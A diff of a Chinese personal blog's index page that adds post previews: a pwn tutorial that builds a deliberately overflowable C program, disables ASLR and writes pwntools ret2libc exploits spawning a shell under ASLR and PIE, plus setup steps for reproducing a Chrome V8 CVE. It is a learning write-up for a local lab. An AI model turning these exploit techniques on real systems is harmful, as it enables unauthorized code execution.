@@ -50,7 +50,7 @@
   isHome: true,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2024-02-08 20:37:15'
+  postUpdate: '2024-02-11 16:49:50'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -139,7 +139,489 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">83</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/" title="pwn入门-1-初识">pwn入门-1-初识</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-11T08:49:11.000Z" title="发表于 2022-10-11 16:49:11">2022-10-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-18T11:41:11.064Z" title="更新于 2023-02-18 19:41:11">2023-02-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​	学pwn有一段时间了,反反复复捣鼓一些东西,还是觉得以博客记录比较好,梳理自己的思路,会以第一人称来写,来记录学习的过程和结局思路(不是那种我是老师,教你学, 而是自己在探索.所以可能有时候会比较傻) 基础知识总有书和博客比我写得好,我觉得没有必要造轮子,所以有些基础知识可能会不会写的太细….反之,有一些博客上漏掉的细节,以及解题的关键会重点写(不会吧不会吧,真有人看你博客吗)
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/" title="pwn入门-3-os保护机制ALSR和PIE">pwn入门-3-os保护机制ALSR和PIE</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-25T08:45:37.000Z" title="发表于 2022-11-25 16:45:37">2022-11-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-18T11:41:19.127Z" title="更新于 2023-02-18 19:41:19">2023-02-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">漏洞代码123456789101112#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;void vuln_func() &#123;	char buf[128];	read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char *argv[]) &#123;	vuln_func();	write(STDOUT_FILENO, &quot;Hello world!\n&quot;, 13);&#125;
+
+开启NX,未开启ALSR和PIEecho 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x2F;&#x2F; 关闭alsr
+gcc -m32 -fno-stack-protector -z noexecstack dep.c
+编译得到a.out
+根据源代码可以知道,这是一个很明显有缓冲区溢出漏洞,定义的数组是128,但读入了256.
+修改libc为2.23
+patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;a.outpatchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;a.out
+确定缓冲区大小输入一点字符
+12345678910111213141516171819202122232425262728293031323334353637383940414243gef➤  telescope0xffffd520│+0x0000: 0x00000000	 ← $esp0xffffd524│+0x0004: 0xffffd530  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&quot;0xffffd528│+0x0008: 0x000001000xffffd52c│+0x000c: 0x5655555c  →  &lt;vuln_func+15&gt; add eax, 0x1a780xffffd530│+0x0010: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&quot;0xffffd534│+0x0014: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&quot;0xffffd538│+0x0018: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&quot;0xffffd53c│+0x001c: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\n&quot;0xffffd540│+0x0020: &quot;aaaaaaaaaaaaaaaaaaaaaaaabbbb\n&quot;0xffffd544│+0x0024: &quot;aaaaaaaaaaaaaaaaaaaabbbb\n&quot;gef➤0xffffd548│+0x0028: &quot;aaaaaaaaaaaaaaaabbbb\n&quot;0xffffd54c│+0x002c: &quot;aaaaaaaaaaaabbbb\n&quot;0xffffd550│+0x0030: &quot;aaaaaaaabbbb\n&quot;0xffffd554│+0x0034: &quot;aaaabbbb\n&quot;0xffffd558│+0x0038: &quot;bbbb\n&quot;0xffffd55c│+0x003c: 0x00000a (&quot;\n&quot;?)0xffffd560│+0x0040: 0x000000000xffffd564│+0x0044: 0x2c307d (&quot;&#125;0,&quot;?)0xffffd568│+0x0048: 0x000000010xffffd56c│+0x004c: 0xf7ffc900  →  0x00000000gef➤0xffffd570│+0x0050: 0xffffd5c0  →  0xffffd5e0  →  0x000000010xffffd574│+0x0054: 0x000000000xffffd578│+0x0058: 0x010000000xffffd57c│+0x005c: 0xc34426000xffffd580│+0x0060: 0x000009 (&quot;\t&quot;?)0xffffd584│+0x0064: 0xffffd7ba  →  &quot;/home/ubuntu/pwn/a.out&quot;0xffffd588│+0x0068: 0xf7e15679  →  &lt;__new_exitfn+9&gt; add ebx, 0x1a79870xffffd58c│+0x006c: 0xf7fc0808  →  0x000000000xffffd590│+0x0070: 0xf7fbd000  →  0x001d7d8c0xffffd594│+0x0074: 0xf7fbd000  →  0x001d7d8cgef➤0xffffd598│+0x0078: 0x000000000xffffd59c│+0x007c: 0xf7e157db  →  &lt;__internal_atexit+59&gt; add esp, 0x100xffffd5a0│+0x0080: 0xf7fbd3fc  →  0xf7fbe200  →  0x000000000xffffd5a4│+0x0084: 0x56556fd4  →  &lt;_GLOBAL_OFFSET_TABLE_+0&gt; fcomp QWORD PTR [esi]0xffffd5a8│+0x0088: 0xffffd67c  →  0xffffd7d1  →  &quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]&quot;0xffffd5ac│+0x008c: 0x5655561b  →  &lt;__libc_csu_init+75&gt; add edi, 0x10xffffd5b0│+0x0090: 0x000000010xffffd5b4│+0x0094: 0x56556fd4  →  &lt;_GLOBAL_OFFSET_TABLE_+0&gt; fcomp QWORD PTR [esi]0xffffd5b8│+0x0098: 0xffffd5c8  →  0x00000000	 ← $ebp
+
+0xffffd5b8 - 0xffffd520 &#x3D;  152
+为什么出不来书上的效果…pattern create 150那个
+为什么书上的和自己运行的不一样? 哪里有区别?
+因为减错了,应该0xffffd5b8 - 0xffffd530 &#x3D; 136才对,再+4, 140覆盖掉ebp,然后下面的就是eip了
+通过gef自带的命令123456789101112131415gef➤  pattern create 150[+] Generating a pattern of 150 bytes (n=4)aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma[+] Saved as &#x27;$_gef0&#x27;gef➤  rStarting program: /home/ubuntu/pwn/a.out[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: &#x27;system-supplied DSO at 0xf7fd8000&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaProgram received signal SIGSEGV, Segmentation fault.0x6261616b in ?? ()gef➤  pattern offset 0x6261616b[+] Searching for &#x27;0x6261616b&#x27;[+] Found at offset 140 (little-endian search) likely[+] Found at offset 1004 (big-endian search)
+
+构造exp整理思路就是返回地址设置为 system,然后给一个参数&#x2F;bin&#x2F;sh就好了
+问题就是寻找它俩的地址,关闭ALSR的情况下,libc的地址是固定的,可以在调试中确认system和&#x2F;bin&#x2F;sh的地址
+123456gef➤  p system$1 = &#123;int (const char *)&#125; 0xf7e57db0 &lt;__libc_system&gt;gef➤  search-pattern &quot;/bin/sh&quot;[+] Searching &#x27;/bin/sh&#x27; in memory[+] In &#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;(0xf7e1d000-0xf7fcd000), permission=r-x  0xf7f78b2b - 0xf7f78b32  →   &quot;/bin/sh&quot;
+
+给的exp同样会有问题(注意 system和&#x2F;bin&#x2F;sh地址要根据实际情况修改,修改了也不行
+[*] Got EOF while sending in interactive
+默认开启了其他保护?????? gcc的问题???
+12345678root@VM-24-10-ubuntu:/home/ubuntu/pwn# python3 exp1.py[+] Starting local process &#x27;./a.out&#x27;: pid 5096[*] &#x27;/home/ubuntu/pwn/a.out&#x27;    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled
+
+gcc -m32 -fno-stack-protector -z noexecstack -z norelro dep.c -fno-pie -no-pie -o a.out
+全关了也不行啊
+libc的保护为什么不影响呢??
+123456gef➤  p system$2 = &#123;int (const char *)&#125; 0xf7e223d0 &lt;__libc_system&gt;gef➤  search-pattern &quot;/bin/sh&quot;[+] Searching &#x27;/bin/sh&#x27; in memory[+] In &#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;(0xf7de5000-0xf7fba000), permission=r-x  0xf7f631db - 0xf7f631e2  →   &quot;/bin/sh&quot;
+
+调试一下,这种如何调试呢??????
+0xf7e57db0
+0xf7f78b2b
+不知道为什么,重新编译了一遍就好了….太奇怪了
+如何动态获取这俩地址呢?system_addr &#x3D; libc.sym[‘system’] 这样是不行的,这个获取的是在libc里面的偏移,需要获取libc的加载地址
+需要基地址,基地址怎么获取呢? 如果没开启ALSR和PIE的话,可以通过调试获取,pwntools里不能直接获取吗?
+12345678gef➤  vmmap[ Legend:  Code | Heap | Stack ]Start      End        Offset     Perm Path0x8047000 0x8048000 0x000000 rw- /home/ubuntu/pwn/a.out0x8048000 0x8049000 0x001000 r-x /home/ubuntu/pwn/a.out0x8049000 0x804a000 0x001000 rw- /home/ubuntu/pwn/a.out0xf7e1c000 0xf7e1d000 0x000000 rw-0xf7e1d000 0xf7fcd000 0x000000 r-x /home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so
+
+0xf7e1d000  + 0x3adb0 &#x3D;  0xf7e57db0 这样就对上了
+system_addr &#x3D; 0xf7e1d000 + libc.sym[‘system’] 就可以得到system的地址了
+但是 binsh_addr &#x3D; 0xf7e1d000 + libc.search(b’&#x2F;bin&#x2F;sh’) 这个不会,会报错 
+oooooo需要加一个next
+binsh_addr &#x3D; 0xf7e1d000 + next(libc.search(b’&#x2F;bin&#x2F;sh’))
+最后exp123456789101112131415from pwn import *log_level = &quot;debug&quot;io = process(&#x27;./a.out&#x27;)libc = ELF(&quot;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;)ret = 0xdeadbeefsystem_addr = 0xf7e1d000 + libc.sym[&#x27;system&#x27;]binsh_addr = 0xf7e1d000 + next(libc.search(b&#x27;/bin/sh&#x27;))#system_addr = 0xf7e57db0#binsh_addr = 0xf7f78b2bpayload = b&quot;A&quot; * 140 + p32(system_addr) + p32(ret) + p32(binsh_addr)io.send(payload)io.interactive()
+
+在此基础之上,开启ALSRecho 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space
+gcc -m32 -fno-stack-protector -z noexecstack -no-pie dep.c -o nopie.out
+echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space
+cp ..&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;libc.so.6 .&#x2F;
+ASLR改变的是堆、栈、共享库(libc等)的位置,程序本身的地址是不变的,也就是vuln_func,main等这些地址.
+构造exp那为啥exp中的write也是不变的呢??????因为这个write是plt中的write,不是libc中的,所以和延迟绑定有关?
+0x8048320是write的地址,它是plt表的地址,所以,什么是plt表呢?
+123.plt:08048320 _write          proc near               ; CODE XREF: main+2D↓p.plt:08048320                 jmp     ds:off_804A014.plt:08048320 _write          endp
+
+关于plt表https://blog.csdn.net/qq_38350702&#x2F;article&#x2F;details&#x2F;123387642
+所以说应该是plt表地址我们是知道的,但是got不知道,通过plt泄露got,进而得到system的got
+因为system不在plt里,无法直接用system的plt
+思路就是先用write泄露write在内存中的位置,然后利用write在libc中和system的偏移,进行计算system和&#x2F;bin&#x2F;sh
+1234567891011121314151617181920from pwn import *io = process(&#x27;./nopie.out&#x27;)elf = ELF(&#x27;./nopie.out&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)vuln_func = 0x0804843b //vuln_funcpayload1 = b&quot;A&quot; * 140 + p32(elf.sym[&#x27;write&#x27;]) + p32(vuln_func) + p32(1) + p32(elf.got[&#x27;write&#x27;]) + p32(4)io.send(payload1)write_addr = u32(io.recv(4))system_addr = write_addr - libc.sym[&#x27;write&#x27;] + libc.sym[&#x27;system&#x27;]binsh_addr = write_addr - libc.sym[&#x27;write&#x27;] + next(libc.search(b&#x27;/bin/sh&#x27;))payload2 = b&quot;B&quot; * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)io.send(payload2)io.interactive()
+
+书里给的有问题,总感觉少了什么条件,exp跑不通
+[] Switching to int eractive mode[] Got EOF while reading in interactive
+为什么第一个exp不行,这个链接里的就可以??,进行分析
+https://blog.csdn.net/weixin_44644249&#x2F;article&#x2F;details&#x2F;113620457
+首先先把payload进行输出
+payload1和2
+b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \x83\x04\x08;\x84\x04\x08\x01\x00\x00\x00\x14\xa0\x04\x08\x04\x00\x00\x00’b’BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xb0\xdd\xd8\xf7;\x84\x04\x08+\xeb\xea\xf7’
+然后再看成功的
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk \x04V\x04\x00\x00 \x04\x04\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk°à÷junk+»ò÷
+所以应该是编码问题?? 或者是作者用的python2?? 是python2和3的问题??
+只能说自己太蠢了,(也想吐槽作者写的不好,不该写死的东西干嘛要写死,自己又没给二进制文件)
+当然更重要的是,不能照抄别人的,要对exp的每一行的含义都了如指掌才可以!!!
+作者在exp中给的 vuln_func的地址是写死的,但事实上自己编译的话肯定会有不同,所以需要根据实际情况修改, 或者直接动态获取,不要写死!!!
+0x080484a5 &lt;+26&gt;:	e8 ac ff ff ff	call 0x8048456 
+exp修改的部分为vuln_func &#x3D; elf.sym[“vuln_func”] 
+1234567891011121314151617181920from pwn import *io = process(&#x27;./nopie.out&#x27;)elf = ELF(&#x27;./nopie.out&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)vuln_func = elf.sym[&quot;vuln_func&quot;] payload1 = b&quot;A&quot; * 140 + p32(elf.sym[&#x27;write&#x27;]) + p32(vuln_func) + p32(1) + p32(elf.got[&#x27;write&#x27;]) + p32(4)io.send(payload1)write_addr = u32(io.recv(4))system_addr = write_addr - libc.sym[&#x27;write&#x27;] + libc.sym[&#x27;system&#x27;]binsh_addr = write_addr - libc.sym[&#x27;write&#x27;] + next(libc.search(b&#x27;/bin/sh&#x27;))payload2 = b&quot;B&quot; * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)io.send(payload2)io.interactive()
+
+在此基础之上,开启PIE开启了pie后,程序的加载地址就不是固定的0x8048000了,所以直接用elf.sym[“vuln_func”] 是不行的,需要知道是从哪里开始加载的了
+gcc -m32 -fno-stack-protector -z noexecstack -pie -fno-pie dep.c -o pie.out
+patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;pie.outpatchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;pie.out
+1234加载的时候,每次地址就不一样了0x565555a3 &lt;main+17&gt;        call   0x5655556d &lt;vuln_func&gt;0x5655556d &lt;vuln_func&gt;:	0x81e58955
+
+结果..加载的地址每次还是一样的,经过排查是gdb的问题
+为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????https://blog.csdn.net/weixin_43350880&#x2F;article&#x2F;details&#x2F;98869099
+因为gdb是默认关闭aslr的,通过在gdb中输入命令aslr on开启,然后每次加载的地址就不一样了
+12345678910110x56630000 0x56631000 0x000000 r-x /home/ubuntu/pwn/pie.out0x56631000 0x56632000 0x000000 r-- /home/ubuntu/pwn/pie.out0x56632000 0x56633000 0x001000 rw- /home/ubuntu/pwn/pie.out0x56613000 0x56614000 0x000000 r-x /home/ubuntu/pwn/pie.out0x56614000 0x56615000 0x000000 r-- /home/ubuntu/pwn/pie.out0x56615000 0x56616000 0x001000 rw- /home/ubuntu/pwn/pie.out0x565f3000 0x565f4000 0x000000 r-x /home/ubuntu/pwn/pie.out0x565f4000 0x565f5000 0x000000 r-- /home/ubuntu/pwn/pie.out0x565f5000 0x565f6000 0x001000 rw- /home/ubuntu/pwn/pie.out
+
+这样的话,elf.sym[“vuln_func”]  就不能用了,因为有一块随机加载的偏移,需要想办法泄露
+假设我们已经泄露了
+ (在dep.c中加入 printf(“main addr: %p”,&amp;main); 但是捏,这个有问题,问题就是哪怕你把它加在了前面,它也是后输出的,这是为什么呢,我们假设的应该是先得到这个地址,然后给vuln_func发送payload
+12345678int main(int argc, char *argv[]) &#123;        printf(&quot;main addr: %p&quot;,&amp;main);        vuln_func();        write(STDOUT_FILENO, &quot;Hello world!\n&quot;, 13);&#125;Hello world!main addr: 0x5658c5d2
+
+write这个应该是和缓冲区什么的有关
+https://oomake.com/question/2542933
+printf带缓冲区,所以要等缓冲区满或者遇到换行符才会输出,write不带缓冲区,直接就输出了
+加一个换行符就可以了
+printf(“main addr: %p\n”,&amp;main);
+exp这里假设了会泄漏main的地址,我们加一行代码就直接打印出来了,
+printf(“%p\n”,&amp;main);
+然后接收main的地址,其他的思路就差不多了
+1234567891011121314151617181920212223242526from pwn import *io = process(&#x27;./pie.out&#x27;)elf = ELF(&#x27;./pie.out&#x27;)libc = ELF(&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;)main_addr = int(io.recvline(), 16)base_addr = main_addr - elf.sym[&#x27;main&#x27;]vuln_func = base_addr + elf.sym[&#x27;vuln_func&#x27;]plt_write = base_addr + elf.sym[&#x27;write&#x27;]got_write = base_addr + elf.got[&#x27;write&#x27;]ebx = base_addr + 0x2000			# GOT addresspayload1 = &quot;A&quot;*132 + p32(ebx) + &quot;AAAA&quot; + p32(plt_write) + p32(vuln_func) + p32(1) + p32(got_write) + p32(4)io.send(payload1)write_addr = u32(io.recv())system_addr = write_addr - libc.sym[&#x27;write&#x27;] + libc.sym[&#x27;system&#x27;]binsh_addr = write_addr - libc.sym[&#x27;write&#x27;] + next(libc.search(&#x27;/bin/sh&#x27;))payload2 = &quot;B&quot; * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)io.send(payload2)io.interactive()
+
+如果printf有其他字母呢,怎么接收?
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析">CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-17T14:20:59.000Z" title="发表于 2022-11-17 22:20:59">2022-11-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T15:22:23.415Z" title="更新于 2023-06-09 23:22:23">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/">浏览器安全</a></span></div><div class="content">tips:标记为橙色的为不严谨,有待研究
+
+V8 漏洞利用之环境搭建一、编译环境搭建以下都出自这篇文章:https://zhuanlan.zhihu.com/p/493674086
+更新软件列表、更新软件、安装依赖
+12345sudo apt-get updatesudo apt-get upgradesudo apt install bison cdbs curl flex g++ git python vim pkg-config
+
+安装depot_tools
+123456mkdir /root/tools &amp;&amp; cd /root/toolsgit clone https://chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_toolsecho &#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27; &gt;&gt; /etc/profileecho &#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27; &gt;&gt; ~/.bashrcsource /etc/profilesource ~/.bashrc
+
+安装ninja：
+123git clone https://github.com/ninja-build/ninja.gitcd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..echo &#x27;export PATH=$PATH:&quot;$(pwd)/ninja&quot;&#x27; &gt;&gt; ~/.bashrc
+
+下载v8
+1234mkdir /root/v8 &amp;&amp; cd /root/v8fetch v8  #这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步cd v8sudo ./build/install-build-deps.sh --no-chromeos-fonts	# 在linux系统中这个命令是需要的
+
+二、找漏洞版本commit编译的话,需要找到漏洞版本的github的commit
+受影响的Chrome最高版本为：89.0.4389.114受影响的V8最高版本为：8.9.255.24
+方法一https://omahaproxy.appspot.com
+通过这个网站可以找漏洞版本的commit
+
+方法二从漏洞的issue链接https://bugs.chromium.org/p/chromium/issues/detail?id=821137找到修复的commit链接https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d ,可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc
+方法三直接从github找commit
+https://github.com/v8/v8/tags?after=8.9.255
+三、编译分了两个版本,一个是release,一个是debug
+123456789进入到v8目录,选择好要编译的commit(不然默认编译最新的)git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599gclient sync # 同步更新# 编译可执行文件 (二选一)tools/dev/v8gen.py x64.debugninja -C out.gn/x64.debug d8上面和下面是二选一tools/dev/v8gen.py x64.relaseninja -C out.gn/x64.relase d8
+
